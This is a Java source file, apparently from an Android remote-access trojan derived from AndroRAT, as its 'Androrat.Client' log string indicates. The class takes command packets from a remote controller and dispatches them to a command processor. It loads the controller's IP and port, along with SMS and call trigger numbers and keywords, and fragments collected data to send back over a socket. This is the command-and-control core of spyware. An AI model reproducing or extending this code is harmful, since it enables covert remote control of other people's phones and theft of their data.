package Cliente;

import android.location.Location;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.IOException;

import Controlador.CommandPacket;
import Controlador.Controler;
import Controlador.LogPacket;
import Controlador.PaquetePreferencias;
import Controlador.Protocolo;
import Controlador.Transporte;
import Libreria.SystemInfo;

/**
 * Created by Vero on 19/05/2015.
 */
public class Cliente extends ClientListener implements Controler {
    public final String TAG = Cliente.class.getSimpleName();

    ProcessCommand procCmd ;
    CommandPacket packet ;
    DataOutputStream out;

    private Handler handler = new Handler() {

        public void handleMessage(Message msg) {
            Bundle b = msg.getData();
            processCommand(b);
        }
    };

    private void processCommand(Bundle b) {
        try{
            procCmd.process(b.getShort("command"),b.getByteArray("arguments"),b.getInt("chan"));
        }
        catch(Exception e) {
            sendError("Error on Client:"+e.getMessage());
        }
    }
    public void onCreate() {
        Log.i(TAG, "In onCreate");
        infos = new SystemInfo(this);
        procCmd = new ProcessCommand(this);

        loadPreferences();
    }

    @Override
    public void Storage(Transporte tp, String i) {
        try
        {
            packet = new CommandPacket();
            packet.parse(tp.getData());

            Message mess = new Message();
            Bundle b = new Bundle();
            b.putShort("command", packet.getCommand());
            b.putByteArray("arguments", packet.getArguments());
            b.putInt("chan", packet.getTargetChannel());
            mess.setData(b);
            handler.sendMessage(mess);
        }
        catch(Exception e)
        {
            System.out.println("Androrat.Client.storage : Sin comando");
        }
    }

    public void loadPreferences() {
        PaquetePreferencias p = procCmd.loadPreferences();
        waitTrigger = p.isWaitTrigger();
        ip = p.getIp();
        port = p.getPort();
        authorizedNumbersCall = p.getPhoneNumberCall();
        authorizedNumbersSMS = p.getPhoneNumberSMS();
        authorizedNumbersKeywords = p.getKeywordSMS();
    }
    public void sendInformation(String infos) {
        sendData(1, new LogPacket(System.currentTimeMillis(), (byte) 0, infos).build());
    }

    public void sendError(String error) {
        sendData(1, new LogPacket(System.currentTimeMillis(), (byte) 1, error).build());
    }

    public void handleData(int channel, byte[] data) {
        sendData(channel, data);
    }

    @Override
    public void onLocationChanged(Location location) {

    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }

    public void sendData(int chan,byte[] data)
    {
        try
        {
            //System.out.println("data " + new String(data));
            Transporte tp;
            boolean last = false;
            boolean envioTotal = false;
            int pointerData = 0;
            short numSeq = 0;
            int actualLenght;

            while (!envioTotal)
            {
                byte[] dataToSend;


                if (last || ((Protocolo.HEADER_LENGTH_DATA + data.length) < Protocolo.MAX_PACKET_SIZE))
                {
                    dataToSend = new byte[Protocolo.HEADER_LENGTH_DATA + (data.length - pointerData)];
                    last = true ;
                    envioTotal = true ;
                }
                else
                    dataToSend = new byte[Protocolo.MAX_PACKET_SIZE];

                actualLenght = dataToSend.length - Protocolo.HEADER_LENGTH_DATA;


                byte[] fragData = new byte[dataToSend.length-Protocolo.HEADER_LENGTH_DATA];
                System.arraycopy(data, pointerData, fragData, 0, fragData.length);
                tp = new Transporte(data.length, actualLenght, chan, last, numSeq, fragData);
                dataToSend = tp.build();
                pointerData = pointerData + actualLenght;
                numSeq++;
                if ((data.length - pointerData) <= (Protocolo.MAX_PACKET_SIZE - Protocolo.HEADER_LENGTH_DATA))
                {
                    last = true;
                }
                try {
                    out.write(dataToSend);
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        }
        catch(NullPointerException e)
        {
            System.out.println("Canal no valido");
            e.printStackTrace();
        }
    }
}

